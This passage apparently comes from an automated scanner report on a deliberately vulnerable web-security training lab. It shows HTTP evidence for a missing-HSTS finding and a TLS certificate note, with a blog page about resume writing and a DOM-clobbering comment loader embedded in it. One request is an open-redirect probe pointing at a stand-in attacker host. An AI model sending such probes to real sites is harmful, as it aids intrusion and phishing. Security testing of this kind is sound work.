                    <p><span id=blog-author>Dean N&apos;Mean</span> | 10 June 2026</p>
                    <hr>
                    <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&apos;t make it a sweaty limp one.</p>
                    <p>The first thing to remember is don&apos;t try and be funny in your job descriptions. If you&apos;ve been working with children the employer doesn&apos;t want to read &apos;could have given them a smack most days, but loved them really&apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.</p>
                    <p>Swearing is usually frowned upon. Just because you&apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&apos;t mean it&apos;s true, or that you should use bad language in your profile.</p>
                    <p>If you are presenting a hard copy of your resume at interview your future boss doesn&apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.</p>
                    <p>Don&apos;t include anything you can&apos;t live up to. Applying to become a ski instructor when you can&apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&apos;t do it don&apos;t include it. Picture everyone&apos;s embarrassment when you have stated you can &apos;do it blindfolded&apos; and you knock over the 15th-century porcelain vase containing the interviewer&apos;s mother&apos;s ashes.</p>
                    <p>It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &apos;laid back&apos;, and they &apos;enjoy the camaraderie of team spirit&apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.</p>
                    <p>Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&apos;t employ.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <span id='user-comments'>
                    <script src='/resources/js/domPurify-2.0.15.js'></script>
                    <script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
                    <script>loadComments('/post/comment')</script>
                    </span>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="oUttzU7I69Y7kohlPeyMa6wz5vMeGztc">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <div>HTML is allowed</div>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6r7ekd-84` — `artifacts/_/ev-mr6r7ekd-84/`

Request:

```http
GET /post?postId=1&redirect=https://evil-attacker.example/ HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: close
content-encoding: gzip
content-length: 3687
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/21.jpg">
                    <h1>The Do&apos;s &amp; Don&apos;ts of Writing Your Resume</h1>
                    <p><span id=blog-author>Dean N&apos;Mean</span> | 10 June 2026</p>
                    <hr>
                    <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&apos;t make it a sweaty limp one.</p>
                    <p>The first thing to remember is don&apos;t try and be funny in your job descriptions. If you&apos;ve been working with children the employer doesn&apos;t want to read &apos;could have given them a smack most days, but loved them really&apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.</p>
                    <p>Swearing is usually frowned upon. Just because you&apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&apos;t mean it&apos;s true, or that you should use bad language in your profile.</p>
                    <p>If you are presenting a hard copy of your resume at interview your future boss doesn&apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.</p>
                    <p>Don&apos;t include anything you can&apos;t live up to. Applying to become a ski instructor when you can&apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&apos;t do it don&apos;t include it. Picture everyone&apos;s embarrassment when you have stated you can &apos;do it blindfolded&apos; and you knock over the 15th-century porcelain vase containing the interviewer&apos;s mother&apos;s ashes.</p>
                    <p>It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &apos;laid back&apos;, and they &apos;enjoy the camaraderie of team spirit&apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.</p>
                    <p>Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&apos;t employ.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <span id='user-comments'>
                    <script src='/resources/js/domPurify-2.0.15.js'></script>
                    <script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
                    <script>loadComments('/post/comment')</script>
                    </span>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="qVERC0jcmucaknU47CmZ9w2CNyPMe6O6">
                            <input required type="hidden" name="postId" value="1">
                            <label>Comment:</label>
                            <div>HTML is allowed</div>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [burp] Strict transport security not enforced (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+1 more URL(s): https://0abb00c50377a549817352fe00530037.web-security-academy.net/post/comment] @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/post

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6r5lsf-81` — `artifacts/_/ev-mr6r5lsf-81/`

Request:

```http
GET /post HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 10649

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/21.jpg">
                    <h1>The Do&apos;s &amp; Don&apos;ts of Writing Your Resume</h1>
                    <p><span id=blog-author>Dean N&apos;Mean</span> | 10 June 2026</p>
                    <hr>
                    <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&apos;t make it a sweaty limp one.</p>
                    <p>The first thing to remember is don&apos;t try and be funny in your job descriptions. If you&apos;ve been working with children the employer doesn&apos;t want to read &apos;could have given them a smack most days, but loved them really&apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.</p>
                    <p>Swearing is usually frowned upon. Just because you&apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&apos;t mean it&apos;s true, or that you should use bad language in your profile.</p>
                    <p>If you are presenting a hard copy of your resume at interview your future boss doesn&apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.</p>
                    <p>Don&apos;t include anything you can&apos;t live up to. Applying to become a ski instructor when you can&apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&apos;t do it don&apos;t include it. Picture everyone&apos;s embarrassment when you have stated you can &apos;do it blindfolded&apos; and you knock over the 15th-century porcelain vase contai
```

<a id="finding-4"></a>

### 4. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6r5ls1-7z` — `artifacts/_/ev-mr6r5ls1-7z/`

Request:

```http
GET / HTTP/1.1
Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```
